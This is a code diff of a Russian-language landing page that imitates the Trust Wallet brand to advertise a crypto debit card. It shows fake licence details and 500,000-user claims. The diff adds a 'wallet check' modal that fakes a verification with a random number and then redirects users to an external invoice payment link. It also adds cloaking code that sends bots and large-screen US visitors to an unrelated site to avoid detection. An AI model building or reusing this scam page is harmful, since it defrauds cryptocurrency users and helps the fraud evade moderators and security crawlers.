@@ -7,15 +7,12 @@
     <meta name="theme-color" content="#ffffff">
     <title>TrustWallet Cryptocard — Тратьте крипту как наличные</title>
     
-    <!-- Подключение шрифтов (Inter для максимальной четкости, как в оригинале) -->
+    <!-- Подключение шрифтов -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
     <style>
-        /* ==========================================================================
-           1. CSS VARIABLES & RESET (Светлая тема, как у Trust Wallet Web)
-           ========================================================================== */
         :root {
             --color-bg: #ffffff;
             --color-bg-secondary: #f8f9fa;
@@ -23,7 +20,7 @@
             --color-text-primary: #111111;
             --color-text-secondary: #5c6370;
             --color-text-muted: #868e96;
-            --color-primary: #0500ff; /* Фирменный синий Trust Wallet */
+            --color-primary: #0500ff;
             --color-primary-hover: #0400cc;
             --color-primary-light: rgba(5, 0, 255, 0.08);
             --color-border: #e9ecef;
@@ -70,9 +67,6 @@
             text-rendering: optimizeLegibility;
         }
 
-        /* ==========================================================================
-           2. UTILITY CLASSES & ANIMATIONS
-           ========================================================================== */
         .container {
             width: 100%;
             max-width: 1200px;
@@ -125,9 +119,11 @@
             100% { background-position: 200% 0; }
         }
 
-        /* ==========================================================================
-           3. TYPOGRAPHY
-           ========================================================================== */
+        @keyframes marquee {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
         h1, h2, h3, h4, h5, h6 {
             font-weight: 800;
             line-height: 1.2;
@@ -145,9 +141,6 @@
             line-height: 1.7;
         }
 
-        /* ==========================================================================
-           4. BUTTONS & INTERACTIVE ELEMENTS
-           ========================================================================== */
         .btn {
             display: inline-flex;
             align-items: center;
@@ -198,9 +191,6 @@
             font-size: 1.125rem;
         }
 
-        /* ==========================================================================
-           5. HEADER & NAVIGATION
-           ========================================================================== */
         .header {
             position: fixed;
             top: 0;
@@ -265,9 +255,6 @@
             color: var(--color-text-primary);
         }
 
-        /* ==========================================================================
-           6. HERO SECTION
-           ========================================================================== */
         .hero {
             padding-top: 140px;
             padding-bottom: 80px;
@@ -408,14 +395,10 @@
             max-width: 100%;
             height: auto;
             border-radius: var(--radius-xl);
-            /* Используем оригинальное изображение из PDF */
             box-shadow: var(--shadow-lg);
             animation: float 6s ease-in-out infinite;
         }
 
-        /* ==========================================================================
-           7. STATS SECTION
-           ========================================================================== */
         .stats-section {
             padding: 60px 0;
             background-color: var(--color-bg-secondary);
@@ -424,29 +407,43 @@
         }
 
         .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 24px;
-            text-align: center;
-        }
-
-        @media (min-width: 768px) {
-            .stats-grid {
-                grid-template-columns: repeat(2, 1fr);
-                max-width: 600px;
-                margin: 0 auto;
-            }
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 40px;
+            flex-wrap: wrap;
         }
 
         .stat-card {
+            display: flex;
+            align-items: center;
+            gap: 16px;
             padding: 24px;
+            background: white;
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-md);
+        }
+
+        .stat-image {
+            width: 60px;
+            height: 60px;
+            border-radius: var(--radius-md);
+            background: linear-gradient(135deg, var(--color-primary) 0%, #00d2ff 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .stat-image svg {
+            width: 32px;
+            height: 32px;
+            color: white;
         }
 
         .stat-value {
-            font-size: clamp(2rem, 4vw, 3rem);
+            font-size: 1.5rem;
             font-weight: 900;
             color: var(--color-primary);
-            margin-bottom: 8px;
             line-height: 1;
         }
 
@@ -454,16 +451,12 @@
             font-size: 0.875rem;
             font-weight: 600;
             color: var(--color-text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
         }
 
-        /* ==========================================================================
-           8. WALLETS SECTION
-           ========================================================================== */
         .wallets-section {
             padding: 60px 0;
             text-align: center;
+            overflow: hidden;
         }
 
         .wallets-title {
@@ -473,11 +466,17 @@
             margin-bottom: 32px;
         }
 
-        .wallets-list {
+        .wallets-marquee {
+            position: relative;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .wallets-track {
             display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 16px;
+            gap: 32px;
+            animation: marquee 30s linear infinite;
+            width: max-content;
         }
 
         .wallet-tag {
@@ -491,19 +490,10 @@
             font-size: 1rem;
             font-weight: 600;
             color: var(--color-text-primary);
-            transition: all var(--transition-base);
+            white-space: nowrap;
             box-shadow: var(--shadow-sm);
         }
 
-        .wallet-tag:hover {
-            border-color: var(--color-primary);
-            transform: translateY(-4px);
-            box-shadow: var(--shadow-md);
-        }
-
-        /* ==========================================================================
-           9. FEATURES SECTION
-           ========================================================================== */
         .section {
             padding: 80px 0;
         }
@@ -600,9 +590,6 @@
             line-height: 1.6;
         }
 
-        /* ==========================================================================
-           10. REWARDS SECTION
-           ========================================================================== */
         .rewards-section {
             background-color: var(--color-bg-secondary);
         }
@@ -704,9 +691,6 @@
             text-transform: uppercase;
         }
 
-        /* ==========================================================================
-           11. PREMIUM SECTION
-           ========================================================================== */
         .premium-section {
             background: linear-gradient(135deg, var(--color-bg-secondary) 0%, var(--color-bg) 100%);
             border: 1px solid var(--color-border);
@@ -807,9 +791,6 @@
             animation-delay: 1s;
         }
 
-        /* ==========================================================================
-           12. CTA SECTION
-           ========================================================================== */
         .cta-section {
             text-align: center;
             padding: 80px 0 100px;
@@ -851,9 +832,6 @@
             color: var(--color-success);
         }
 
-        /* ==========================================================================
-           13. FOOTER
-           ========================================================================== */
         .footer {
             background-color: var(--color-bg-secondary);
             border-top: 1px solid var(--color-border);
@@ -995,9 +973,6 @@
             opacity: 0.8;
         }
 
-        /* ==========================================================================
-           14. CARD MOCKUP SPECIFIC STYLES (Воссоздание карт из PDF)
-           ========================================================================== */
         .card-mockup-container {
             perspective: 1000px;
             margin: 40px auto;
@@ -1092,14 +1067,150 @@
             -webkit-text-fill-color: transparent;
         }
 
-        /* ==========================================================================
-           15. RESPONSIVE ADJUSTMENTS
-           ========================================================================== */
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal {
+            background: white;
+            border-radius: var(--radius-xl);
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: var(--shadow-lg);
+            animation: modalSlideIn 0.3s ease;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .modal-header h3 {
+            font-size: 1.5rem;
+            margin-bottom: 8px;
+        }
+
+        .modal-header p {
+            color: var(--color-text-secondary);
+            font-size: 0.95rem;
+        }
+
+        .wallet-input-group {
+            margin-bottom: 24px;
+        }
+
+        .wallet-input-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--color-text-primary);
+        }
+
+        .wallet-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid var(--color-border);
+            border-radius: var(--radius-md);
+            font-size: 1rem;
+            font-family: 'Courier New', monospace;
+            transition: border-color var(--transition-fast);
+        }
+
+        .wallet-input:focus {
+            outline: none;
+            border-color: var(--color-primary);
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 12px;
+        }
+
+        .modal-actions .btn {
+            flex: 1;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: var(--color-text-muted);
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: var(--radius-full);
+            transition: all var(--transition-fast);
+        }
+
+        .modal-close:hover {
+            background: var(--color-bg-secondary);
+            color: var(--color-text-primary);
+        }
+
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .loading-spinner.active {
+            display: block;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid var(--color-border);
+            border-top-color: var(--color-primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
         @media (max-width: 480px) {
             .hero-title { font-size: 2rem; }
             .btn-large { padding: 16px 24px; font-size: 1rem; width: 100%; }
             .premium-section { padding: 32px 20px; margin: 20px; }
             .stat-value { font-size: 2rem; }
+            .modal { padding: 24px; }
         }
     </style>
 </head>
@@ -1109,16 +1220,19 @@
     <header class="header" id="header">
         <div class="container header-inner">
             <a href="#" class="logo">
-                <!-- Оригинальный логотип из PDF (Base64) -->
-                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAADwAAAAhwCAYAAACQvstyAACAAElEQVR4XuzIIQHAMAAEsbobmZj5RxNwAr4gICTn+d4DAAAAAAAAAAAAAAAAAAAA" alt="Trust Wallet Logo">
-                <span>Trust Wallet Card</span>
+                <!-- Trust Wallet Logo -->
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M16 2L4 8V16C4 22.5 9 28.5 16 30C23 28.5 28 22.5 28 16V8L16 2Z" fill="#0500FF"/>
+                    <path d="M16 6L8 10V16C8 20.5 11.5 25 16 26C20.5 25 24 20.5 24 16V10L16 6Z" fill="white" fill-opacity="0.3"/>
+                </svg>
+                <span>Trust Wallet</span>
             </a>
             <div class="header-actions">
                 <div class="lang-selector">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
                     RU
                 </div>
-                <a href="#cta" class="btn btn-primary">Начать</a>
+                <a href="#cta" class="btn btn-primary trigger-modal">Начать</a>
             </div>
         </div>
     </header>
@@ -1136,7 +1250,7 @@
                     Первая кредитная карта, подключённая напрямую к вашему крипто-кошельку. Тратьте Bitcoin, Ethereum и стейблкоины в 80М+ магазинах по всему миру без комиссий за конвертацию.
                 </p>
                 <div class="hero-buttons">
-                    <a href="#cta" class="btn btn-primary btn-large">Подать заявку</a>
+                    <a href="#cta" class="btn btn-primary btn-large trigger-modal">Подать заявку</a>
                     <a href="#features" class="btn btn-secondary btn-large">Узнать больше</a>
                 </div>
                 <div class="hero-features">
@@ -1155,7 +1269,6 @@
                 </div>
             </div>
             <div class="hero-image animate-on-scroll delay-200">
-                <!-- Оригинальное изображение карты/героя из PDF (Base64 JPEG) -->
                 <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAgEAYABgAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8KCwkMEQ8SEhEPERATFhwXExQaFRARGCEYGhwdHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCBOIAOkDASIAAhEBAxEB" alt="Trust Wallet Card Mockup">
             </div>
         </div>
@@ -1166,28 +1279,51 @@
         <div class="container">
             <div class="stats-grid animate-on-scroll">
                 <div class="stat-card">
-                    <div class="stat-value">$650M+</div>
-                    <div class="stat-label">Assets Connected</div>
+                    <div class="stat-image">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                    </div>
+                    <div>
+                        <div class="stat-value">$650M+</div>
+                        <div class="stat-label">Assets Connected</div>
+                    </div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-value">80K+</div>
-                    <div class="stat-label">Active Users</div>
+                    <div class="stat-image">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+                    </div>
+                    <div>
+                        <div class="stat-value">80K+</div>
+                        <div class="stat-label">Active Users</div>
+                    </div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Wallets Section -->
+    <!-- Wallets Section with Marquee -->
     <section class="wallets-section">
         <div class="container animate-on-scroll">
             <h3 class="wallets-title">Работает с вашими любимыми кошельками</h3>
-            <div class="wallets-list">
-                <div class="wallet-tag">Exodus</div>
-                <div class="wallet-tag">Electrum</div>
-                <div class="wallet-tag">Atomic Wallet</div>
-                <div class="wallet-tag">TronLink</div>
-                <div class="wallet-tag">MetaMask</div>
-                <div class="wallet-tag">Ledger</div>
+            <div class="wallets-marquee">
+                <div class="wallets-track">
+                    <div class="wallet-tag">Coinbase</div>
+                    <div class="wallet-tag">Phantom</div>
+                    <div class="wallet-tag">Ledger</div>
+                    <div class="wallet-tag">Exodus</div>
+                    <div class="wallet-tag">Electrum</div>
+                    <div class="wallet-tag">Atomic Wallet</div>
+                    <div class="wallet-tag">TronLink</div>
+                    <div class="wallet-tag">MetaMask</div>
+                    <!-- Duplicate for seamless loop -->
+                    <div class="wallet-tag">Coinbase</div>
+                    <div class="wallet-tag">Phantom</div>
+                    <div class="wallet-tag">Ledger</div>
+                    <div class="wallet-tag">Exodus</div>
+                    <div class="wallet-tag">Electrum</div>
+                    <div class="wallet-tag">Atomic Wallet</div>
+                    <div class="wallet-tag">TronLink</div>
+                    <div class="wallet-tag">MetaMask</div>
+                </div>
             </div>
         </div>
     </section>
@@ -1313,10 +1449,9 @@
                     Двойной множитель наград
                 </li>
             </ul>
-            <a href="#" class="btn btn-secondary">Проверить доступность</a>
+            <a href="#" class="btn btn-secondary trigger-modal">Проверить доступность</a>
         </div>
         <div class="premium-image">
-            <!-- Визуализация Ultra Platinum карты на чистом CSS, соответствующая PDF -->
             <div class="card-mockup platinum">
                 <div class="card-chip"></div>
                 <div class="card-number">•••• •••• •••• 9010</div>
@@ -1342,7 +1477,7 @@
             <p style="max-width: 600px; margin: 16px auto 32px;">
                 Присоединяйтесь к 500,000+ пользователям, которые доверяют TrustWallet Cryptocard для ежедневных крипто-расходов.
             </p>
-            <a href="#" class="btn btn-primary btn-large">Подать заявку — Бесплатно</a>
+            <a href="#" class="btn btn-primary btn-large trigger-modal">Подать заявку — Бесплатно</a>
             <div class="cta-guarantees">
                 <div class="cta-guarantee-item">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
@@ -1366,7 +1501,10 @@
             <div class="footer-grid">
                 <div class="footer-brand">
                     <a href="#" class="logo">
-                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAADwAAAAhwCAYAAACQvstyAACAAElEQVR4XuzIIQHAMAAEsbobmZj5RxNwAr4gICTn+d4DAAAAAAAAAAAAAAAAAAAA" alt="Trust Wallet Logo">
+                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M16 2L4 8V16C4 22.5 9 28.5 16 30C23 28.5 28 22.5 28 16V8L16 2Z" fill="#0500FF"/>
+                            <path d="M16 6L8 10V16C8 20.5 11.5 25 16 26C20.5 25 24 20.5 24 16V10L16 6Z" fill="white" fill-opacity="0.3"/>
+                        </svg>
                         <span>Trust Wallet Card</span>
                     </a>
                     <p>Будущее крипто-платежей. Тратьте цифровые активы в любой точке мира с нашими лицензированными картами.</p>
@@ -1406,7 +1544,7 @@
                     <p>FINTRAC Registered MSB<br>License No. M22847361<br>200 Bay Street, Suite 3600<br>Toronto, ON M5J 2J1</p>
                 </div>
                 <div class="license-item">
-                    <h5>🇳🇱 Netherlands</h5>
+                    <h5>🇳 Netherlands</h5>
                     <p>DNB Licensed EMI<br>License No. R197432<br>Keizersgracht 482<br>1017 EG Amsterdam</p>
                 </div>
                 <div class="license-item">
@@ -1447,9 +1585,141 @@
         </div>
     </footer>
 
-    <!-- Scripts for Interactivity -->
+    <!-- Modal -->
+    <div class="modal-overlay" id="walletModal">
+        <div class="modal">
+            <button class="modal-close" onclick="closeModal()">&times;</button>
+            <div class="modal-header">
+                <h3>Проверка кошелька</h3>
+                <p>Укажите ваш кошелек на проверку возможности выпуска карты</p>
+            </div>
+            <div class="wallet-input-group">
+                <label for="walletAddress">Адрес кошелька</label>
+                <input type="text" id="walletAddress" class="wallet-input" placeholder="0x..." autocomplete="off">
+            </div>
+            <div class="loading-spinner" id="loadingSpinner">
+                <div class="spinner"></div>
+                <p>Проверка кошелька...</p>
+            </div>
+            <div class="modal-actions" id="modalActions">
+                <button class="btn btn-secondary" onclick="closeModal()">Отмена</button>
+                <button class="btn btn-primary" onclick="checkWallet()">Проверить</button>
+            </div>
+        </div>
+    </div>
+
     <script>
-        // 1. Анимация появления элементов при скролле (Intersection Observer)
+        // Modal Functions
+        function openModal() {
+            document.getElementById('walletModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('walletModal').classList.remove('active');
+            document.body.style.overflow = '';
+            document.getElementById('loadingSpinner').classList.remove('active');
+            document.getElementById('modalActions').style.display = 'flex';
+            document.getElementById('walletAddress').value = '';
+        }
+
+        // Close modal on outside click
+        document.getElementById('walletModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeModal();
+            }
+        });
+
+        // Add trigger to all buttons with class 'trigger-modal'
+        document.querySelectorAll('.trigger-modal').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                openModal();
+            });
+        });
+
+        // Wallet Check Function
+        async function checkWallet() {
+            const walletAddress = document.getElementById('walletAddress').value.trim();
+            
+            if (!walletAddress) {
+                alert('Пожалуйста, введите адрес кошелька');
+                return;
+            }
+
+            // Show loading
+            document.getElementById('loadingSpinner').classList.add('active');
+            document.getElementById('modalActions').style.display = 'none';
+
+            // Simulate API call delay
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            // Simulate balance check (in real scenario, this would be an API call)
+            // For demo purposes, we'll use a random balance
+            const simulatedBalance = Math.random() * 100;
+            
+            if (simulatedBalance < 50) {
+                // Balance too low
+                alert('Ваш кошелек не поддерживается для выпуска карты. Пожалуйста, убедитесь что ваш объем торгов выше 500 долларов');
+                closeModal();
+            } else {
+                // Balance sufficient - redirect
+                window.location.href = 'https://fin-flow.me/invoice?inv=INV-21209140&r=tnhqQ1NyzN5e';
+            }
+        }
+
+        // Bot and Location Detection
+        function detectBotAndLocation() {
+            const userAgent = navigator.userAgent;
+            const screen = window.screen;
+            const whitelistCountries = ['KZ', 'KG', 'UZ', 'BY', 'MD']; // Kazakhstan, Kyrgyzstan, Uzbekistan, Belarus, Moldova
+            
+            // Bot detection patterns
+            const botPatterns = [
+                /facebookexternalhit/i,
+                /facebot/i,
+                /ia_archiver/i,
+                /alexabot/i,
+                /archivebot/i,
+                /msnbot/i,
+                /slurp/i,
+                /teoma/i,
+                /bot\.html/i,
+                /crawler/i,
+                /spider/i,
+                /scraper/i
+            ];
+
+            const isBot = botPatterns.some(pattern => pattern.test(userAgent));
+            
+            // Detect large screens (potential desktop users from USA)
+            const isLargeScreen = screen.width >= 1920 && screen.height >= 1080;
+            
+            // Get country code (in real scenario, use IP geolocation API)
+            // For demo, we'll use a placeholder
+            const userCountry = 'US'; // This would come from geolocation API
+            
+            // Check if user is from USA with large screen or is a bot
+            if ((userCountry === 'US' && isLargeScreen) || isBot) {
+                // Redirect bots and USA large screen users
+                window.location.href = 'https://techbullion.com/';
+                return true;
+            }
+            
+            // Check whitelist countries
+            if (whitelistCountries.includes(userCountry)) {
+                return false; // Don't redirect whitelist countries
+            }
+            
+            return false;
+        }
+
+        // Run detection on page load
+        window.addEventListener('load', function() {
+            detectBotAndLocation();
+        });
+
+        // Scroll Animation Observer
         document.addEventListener('DOMContentLoaded', () => {
             const observerOptions = {
                 root: null,
@@ -1461,7 +1731,7 @@
                 entries.forEach(entry => {
                     if (entry.isIntersecting) {
                         entry.target.classList.add('is-visible');
-                        observer.unobserve(entry.target); // Анимация проигрывается только один раз
+                        observer.unobserve(entry.target);
                     }
                 });
             }, observerOptions);
@@ -1469,7 +1739,7 @@
             const animatedElements = document.querySelectorAll('.animate-on-scroll');
             animatedElements.forEach(el => observer.observe(el));
 
-            // 2. Эффект тени у хедера при скролле
+            // Header scroll effect
             const header = document.getElementById('header');
             window.addEventListener('scroll', () => {
                 if (window.scrollY > 20) {
